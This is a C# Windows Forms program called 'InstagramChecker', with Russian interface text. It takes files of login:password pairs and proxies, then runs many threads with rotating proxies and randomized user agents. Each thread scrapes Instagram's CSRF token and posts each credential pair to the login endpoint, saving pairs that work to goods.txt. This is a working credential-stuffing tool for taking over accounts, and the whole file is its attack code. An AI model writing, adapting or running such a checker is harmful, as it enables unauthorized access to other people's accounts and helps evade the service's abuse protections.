using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using Newtonsoft.Json;
using Leaf.xNet;
using System.Threading;

namespace InstagramChecker
{
    public partial class Form1 : Form
    {
        public int threadCount = 1;
        public List<Task> threads = new List<Task>();
        public List<Account> accounts = new List<Account>();
        public List<string> proxies = new List<string>();
        public ProxyType proxyType;
        public int proxyForAccount = 1;
        public int goods;
        public int bads;
        public int completed;
        public int errors;

        public CancellationTokenSource cts = new CancellationTokenSource();
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;

            Task updateThread = new Task(DataUpdate);
            updateThread.Start();
        }

        private void StartBTN_Click(object sender, EventArgs e)
        {
            Task startThread = new Task(Start);
            startThread.Start();
        }
        public void Start()
        {
            threadCount = (int)threadCountNUM.Value;
            threads = new List<Task>(threadCount);
            proxyType = GetProxyType();

            for (int i = 0; i < threadCount; i++)
            {
                Task task = Task.Run(() => Check(cts.Token));
                threads.Add(task);
            }
            Task.WaitAll(threads.ToArray());
            LogAdd("Все потоки завершили работу", Color.Green);
            UnLoadAccounts();
        }
        public void Check(CancellationToken cancellationToken)
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                HttpRequest request = new HttpRequest();
                request.UserAgentRandomize();

                if (proxies.Count > 0)
                {
                    string proxy = proxies.First();
                    proxies.Remove(proxy);

                    request.Proxy = ProxyClient.Parse(proxyType, proxy);
                }

                for (int i = 0; i < proxyForAccount; i++)
                {
                    Account account = accounts.Find(x => x.status == Status.IN_QUEU);
                    if (account == null)
                    {
                        LogAdd("Поток завершил работу", Color.Green);
                        return;
                    }
                    try
                    {
                        account.status = Status.IN_PROCESS;

                        request.KeepAlive = true;
                        request.Cookies = new CookieStorage();

                        string response = request.Get("https://www.instagram.com/accounts/login/").ToString();
                        string ajax = instagramAjax(response);
                        string token = csrfToken(response);

                        request.AddHeader(HttpHeader.Accept, "*/*");
                        request.AddHeader(HttpHeader.ContentType, "application/x-www-form-urlencoded");
                        request.AddHeader(HttpHeader.Origin, "https://www.instagram.com");
                        request.AddHeader(HttpHeader.Referer, "https://www.instagram.com/accounts/login/");
                        request.AddHeader("Accept-Encoding", "gzip, deflate, br");
                        request.AddHeader("Accept-Language", "uk-UA,uk;q=0.9,ru;q=0.8,en-US;q=0.7,en;q=0.6");
                        request.AddHeader("X-CSRFToken", token);
                        request.AddHeader("X-Instagram-AJAX", ajax);
                        request.AddHeader("X-Requested-With", "XMLHttpRequest");

                        RequestParams requestParams = new RequestParams();
                        requestParams["username"] = account.login;
                        requestParams["password"] = account.password;
                        requestParams["optIntoOneTap"] = false;

                        string authResponse = request.Post("https://www.instagram.com/accounts/login/ajax/", requestParams).ToString();
                        AuthData json = JsonConvert.DeserializeObject<AuthData>(authResponse);
                        if (json.authenticated)
                        {
                            account.status = Status.GOOD;
                            goods++;
                        }
                        else
                        {
                            account.status = Status.BAD;
                            bads++;
                        }
                    }
                    catch (Exception ex)
                    {
                        LogAdd($"Ошибка: {ex.Message}{Environment.NewLine}StackTrace: {ex.StackTrace}", Color.Red);
                        errors++;
                    }
                    finally
                    {
                        completed++;
                    }
                }
            }
        }
        public string csrfToken(string response)
        {
            string token = Regex.Match(response, @"""csrf_token"":""(\S*)"",""viewer").Groups[1].Value;
            return token;
        }
        public string instagramAjax(string response)
        {
            string ajax = Regex.Match(response, @"""rollout_hash"":""(\S*)"",""bundle_variant").Groups[1].Value;
            return ajax;
        }
        public void DataUpdate()
        {
            while (true)
            {
                label2.Text = $"Проверено: {completed}/{accounts.Count}";
                label3.Text = $"Валидов: {goods}";
                label4.Text = $"Невалидов: {bads}";
                label5.Text = $"Ошибок: {errors}";

                label7.Text = $"Осталось прокси: {proxies.Count}";

                Task.Delay(250).Wait();   
            }
        }
        private void Button2_Click(object sender, EventArgs e)
        {
            if(openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                accounts = GetAccounts(openFileDialog1.FileName).ToList();
                LogAdd("Аккаунты загружены!", Color.Green);
            }
        }
        public IEnumerable<Account> GetAccounts(string path)
        {
            if (!File.Exists(path))
            {
                LogAdd("Выбранного файла не существует", Color.Red);
            }

            using (StreamReader sr = new StreamReader(path))
            {
                string l = "l";
                while ((l = sr.ReadLine()) != null && l != "")
                {
                    string[] data = l.Split(':');
                    if (data.Length < 2)
                    {
                        LogAdd("Данные аккаунтов разделены не ':'", Color.Red);
                        l = "l";
                    }
                    Account account = new Account(data[0], data[1]);

                    yield return account;
                }
            }
        }
        private void Button1_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                proxies = GetProxies(openFileDialog1.FileName).ToList();
                LogAdd("Прокси загружены!", Color.Green);
            }
        }
        public IEnumerable<string> GetProxies(string path)
        {
            if (!File.Exists(path))
            {
                LogAdd("Выбранного файла не существует", Color.Red);
            }

            using (StreamReader sr = new StreamReader(path))
            {
                string l = "l";
                while ((l = sr.ReadLine()) != null && l != "")
                {
                    string[] data = l.Split(':');
                    if (data.Length == 2 || data.Length == 4)
                    {
                        yield return l;
                    }
                    else
                    {
                        l = "l";
                        LogAdd("Прокси указаны в неверном формате", Color.Red);
                    }
                }
            }
        }
        public void UnLoadAccounts()
        {
            StreamWriter goodSR = new StreamWriter("goods.txt", true);
            StreamWriter badSR = new StreamWriter("bads.txt", true);
            StreamWriter errorSR = new StreamWriter("errors.txt", true);
            for (int i = 0; i < accounts.Count; i++)
            {
                if(accounts[i].status == Status.GOOD)
                {
                    goodSR.WriteLine(accounts[i].ToString());
                }
                else if (accounts[i].status == Status.BAD)
                {
                    badSR.WriteLine(accounts[i].ToString());
                }
                else if (accounts[i].status == Status.ERROR)
                {
                    errorSR.WriteLine(accounts[i].ToString());
                }
            }
            try
            {
                goodSR.Dispose();
                badSR.Dispose();
                errorSR.Dispose();
            }
            catch { }
        }
        public int GetProxyForAccount()
        {
            int _proxyForAccount = 0;
            float k = accounts.Count / proxies.Count;
            if(k > 1)
            {
                _proxyForAccount = 1;
            }
            else
            {
                _proxyForAccount = (int)k;
            }
            return _proxyForAccount;
        }
        public ProxyType GetProxyType()
        {
            if(comboBox1.SelectedText == "HTTP")
            {
                return ProxyType.HTTP;
            }
            else if (comboBox1.SelectedText == "SOCKS4")
            {
                return ProxyType.Socks4;
            }
            else if (comboBox1.SelectedText == "SOCKS5")
            {
                return ProxyType.Socks5;
            }
            return ProxyType.Socks4A;
        }
        public void LogAdd(string text, Color color)
        {
            string line = $"{DateTime.Now} {text} {Environment.NewLine}";
            logBox.AppendText(line);
            logBox.Select(logBox.TextLength - line.Length + 1, line.Length);
            logBox.SelectionColor = color;
        }

        private void Button4_Click(object sender, EventArgs e)
        {
            cts.Cancel();
            LogAdd("Потоки останавливаются", Color.Orange);
        }
    }
}
